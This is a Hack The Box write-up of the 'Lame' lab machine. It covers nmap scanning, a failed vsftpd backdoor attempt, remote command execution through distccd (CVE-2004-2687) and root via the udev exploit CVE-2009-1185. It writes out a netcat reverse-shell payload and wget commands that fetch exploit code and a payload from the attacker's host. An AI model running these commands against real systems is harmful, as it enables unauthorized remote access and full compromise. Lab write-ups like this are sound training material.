Hack The Box — Lame Writeup
==========================================

![Image of Lame](https://github.com/s-farhat/HTB-WriteUps/blob/master/images/Lame.png)

**Personal review**: This Machine took me about three (3) hours to gain root privilege. It was pretty easy however, as I'm trying to avoid working w/o Metasploit and, as the version of Linux deployed on this box contains many vulnerabilities, it was pretty challenging.


### 1. Reconnaissance
First of all, i run a quick nmap scan to figure out which ports are opened and also the service running behind those ports.<br>
```
nmap -sC -sV -O 10.10.10.3 > Quick-scan-Lame.nmap
```
The output of the last command showed the open ports listed below:
* 21/tcp : vsftpd 2.3.4
* 22/tcp : OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
* 139/tcp & 445/tcp : netbios-ssn Samba smbd 3.X - 4.X 

Before working on those results, i run a full nmap scan in order to make sure that i didn't miss any other opened ports. <br>
```
nmap -sC -sV -O -p- 10.10.10.3 > Full-scan-Lame.nmap
```
This full scan reported a new open port:
* 3632/tcp : distccd v1


### 2. Enumeration:
After getting the result of the quick scan, i immidiately start the enumeration phase.
First of all i tried to login with Anonymous:<blank password>. This vulnerability was present, but unfortunately, the directory is empty.<br>
Always on the port 21, i notice that the service running is vsftpd 2.3.4 . I already know that this version is vulnerable and the first idea that come to my mind is to launch the command below:
```
searchsploit vsftpd 2.3.4
```
```
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execut | exploits/unix/remote/17491.rb
--------------------------------------- ----------------------------------------
```
The result showed that only a metasploit module is found. Then, with a simple google search i was able to find a [Python script](https://github.com/s-farhat/HTB-WriteUps/blob/master/scripts/Lame/exploit.py) which serve to exploit this vulnerability. After cloning it and reviewing the content, i decided to execute it in order to get my first shell.
<br>Unfortunately, the script returned `[!] Failed to connect to backdoor`, so i realized that the service isn't vulnerable to **[CVE-2011-2523](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523)**


Before moving on the next port, i got the result of my full scan command and i realized that the distcc service is running under the port 3632. I didn't know what this service represents and this was sufficient to catch my curiosity. <br>
I started with a simple google search to know more about this service and then I figured out that:
- Distcc is a tool for speeding up compilation of source code by using distributed computing over a computer network. 

This was pretty interesting for me and i decided to focus on this service. The next step was to search if there is a known vulnerability to exploit this service.<br>
The `searchsploit` command returned only one result which is a metasploit module so I had to search for another solution.<br>
After a while, i realized that there is a nmap script which serve to exploit this service.<br>
At first, i tried to understand what the script exactly does and then i launched the command below:
```
nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```
And finally, the result confirmed that this service is vulnerable.
```
PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
```
In order to get a reverse shell, i started the command below:
```
nc -nlvp 4444
```
and in another terminal i executed the command below:
```
nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc 10.10.14.24 4444 -e /bin/bash'"
```

And **finally**, i got the reverse shell with `daemon` privilege and after performing `ls -la` on the user's home directory, i realized that I'm able to read the user.txt file.
```
-rw-r--r-- 1 makis makis 33 Mar 14  2017 /home/makis/user.txt
```
### 3. Privilege Escalation:

As this box is rated Low. The first thing that i have done is to check the Kernel Version and it is `Linux 2.6.24`.
I realized that this version is an old one and contains many vulnerabilities. I focused on this vector to gain root privilege.<br>
After unsuccessful tries, I put my hands on the [Cve-2009-1185](https://www.exploit-db.com/exploits/8572) then i understood what it do exactly and then tried to give a try.
At first, I launched a Simple HTTP Server using python over port 80 using the command below:
```
python -m SimpleHTTPServer 80
```
Then from the reverse shell, I downloaded [the exploit](https://github.com/s-farhat/HTB-WriteUps/blob/master/scripts/Lame/8572.c) and then compiled it with gcc
```
wget http://10.10.14.24/8572.c
gcc 8572.c -o exploit
```
As mentioned in the description of the exploit, i should to look after the pid of the **udevd netlink socket**, inject a payload into **/tmp/run**, start listening on a specific port to intercept the reverse shell and start the exploit . Here's below the commands that i performed:
```
ps -aux | grep udevd
```
```
root      2688  0.0  0.1   2216   644 ?        S<s  Apr26   0:00 /sbin/udevd --daemon
```
PS : With this first command i deduct that the number that we have to pass as an argument for the exploit is (2688 - 1 ) = **2687**

```
wget http://10.10.14.24/payload | mv payload /tmp/run
```
And on another terminal i launched this command below to start listening on a specific tcp port:

```
nc -nlvp 4445
```
And Finaly, I executed the payload with this command below:
```
./exploit 2687
```

**Box Rooted !!!**

